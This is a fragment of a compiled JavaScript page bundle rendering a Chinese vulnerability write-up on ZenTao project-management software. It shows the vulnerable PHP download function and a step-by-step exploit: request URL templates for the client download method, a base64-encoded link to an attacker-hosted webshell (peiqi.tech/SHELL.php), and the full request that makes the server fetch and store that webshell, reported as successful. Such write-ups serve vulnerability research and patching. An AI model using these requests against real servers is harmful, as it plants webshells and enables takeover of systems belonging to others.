punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$remote")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("feof")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$remote")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$buffer")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fread")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$remote")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4096")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fwrite")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$local")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$buffer")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fclose")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$local")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fclose")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$remote")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[s._v("commonModel")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("getSysURL")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("config")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("webRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br")])]),n("p",[s._v("可以简单看到这里获取link传入的文件名，通过"),n("strong",[s._v("fopen")]),s._v("打开该文件，写入禅道目录"),n("strong",[s._v("www/data/client/version")]),s._v("中")]),s._v(" "),n("p",[s._v("查看一下有没有调用这个方法的地方")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1028),alt:"img"}})]),s._v(" "),n("p",[s._v("找到了"),n("strong",[s._v("download")]),s._v("方法调用了这个漏洞点，所以我们有两种下载恶意文件的方法")]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("http://xxx.xxx.xxx.xxx/www/client-download-[$version参数]-[base64加密后的恶意文件地址].html\nhttp://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version参数]&link=[base64加密后的恶意文件地址]\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("首先先上传一个恶意文件，可以是FTP也可以是HTTP")]),s._v(" "),n("p",[s._v("例如我上传的文件URL为"),n("a",{attrs:{href:"http://peiqi.tech/SHELL.php",target:"_blank",rel:"noopener noreferrer"}},[n("strong",[s._v("http://peiqi.tech/SHELL.php")]),n("OutboundLink")],1)]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("http://peiqi.tech/SHELL.php\n|\nbase64加密  HTTP://peiqi.tech/SHELL.php\n|\nSFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br")])]),n("p",[s._v("请求地址则为")]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1029),alt:"img"}})]),s._v(" "),n("p",[s._v("下载的目录地址为"),n("strong",[s._v("zentaopms\\www\\data\\client\\1")])]),s._v(" "),n("p",[s._v("[!NOTE]")]),s._v(" "),n("p",[s._v("目录为version名称")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1030),alt:"img"}})]),s._v(" "),n("p",[s._v("成功上传webshell")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1031),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:""}},[n("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])])],1)}),[],!1,null,null,null);t.default=e.exports}}]);